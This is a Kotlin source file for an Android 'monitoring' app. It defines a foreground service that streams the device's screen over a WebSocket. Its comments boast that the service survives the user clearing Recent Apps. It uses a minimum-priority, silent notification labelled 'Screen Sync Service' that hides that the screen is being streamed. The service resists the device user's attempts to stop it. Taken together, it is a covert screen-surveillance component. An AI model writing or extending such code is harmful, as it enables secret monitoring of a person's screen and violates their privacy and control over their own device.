package com.spapp.monitoring.screenstream

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.spapp.monitoring.R
import com.spapp.monitoring.data.DeviceState

/**
 * Foreground Service for live screen streaming.
 *
 * Keeps SPApp's process elevated to FOREGROUND_SERVICE priority so Android's
 * Low Memory Killer (LMK) and battery/network throttling do NOT drop the WebSocket
 * connection or kill the capture loop when the user opens, closes, or switches
 * between memory-heavy third-party apps (e.g. Instagram, WhatsApp, YouTube, Games).
 */
class ScreenStreamService : Service() {

    companion object {
        private const val TAG = "ScreenStreamService"
        private const val NOTIFICATION_ID = 2004
        private const val CHANNEL_ID = "spapp_screen_stream_channel"

        const val ACTION_START = "com.spapp.monitoring.action.START_SCREEN"
        const val ACTION_STOP = "com.spapp.monitoring.action.STOP_SCREEN"

        fun start(context: Context) {
            val intent = Intent(context, ScreenStreamService::class.java).apply {
                action = ACTION_START
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start ScreenStreamService", e)
            }
        }

        fun stop(context: Context) {
            ScreenStreamManager.stopStreaming()
            try {
                val intent = Intent(context, ScreenStreamService::class.java).apply {
                    action = ACTION_STOP
                }
                context.startService(intent)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: ACTION_START

        if (action == ACTION_STOP) {
            Log.d(TAG, "Stopping screen stream service")
            ScreenStreamManager.stopStreaming()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // Elevate to Foreground Service with silent ongoing notification (OOM Rank 200).
        // This makes the process IMMUNE to being killed when the user taps "Clear all" in Recent Apps!
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, buildNotification())
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to elevate to foreground service", e)
        }

        val state = DeviceState(applicationContext)
        val authToken = state.authToken
        val deviceId = state.getEffectiveDeviceId()

        if (authToken != null && deviceId != null) {
            Log.d(TAG, "Starting screen stream manager with persistent foreground priority")
            ScreenStreamManager.startStreaming(
                context = applicationContext,
                authToken = authToken,
                deviceId = deviceId,
                onStreamStopped = {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            )
        } else {
            Log.w(TAG, "Missing auth token or device ID — stopping screen stream service")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "onTaskRemoved: preserving screen stream execution across recents clear")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "ScreenStreamService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Monitoring Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Active screen synchronization"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Sync Service")
            .setContentText("Background screen synchronization active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setSound(null)
            .setVibrate(null)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }
}
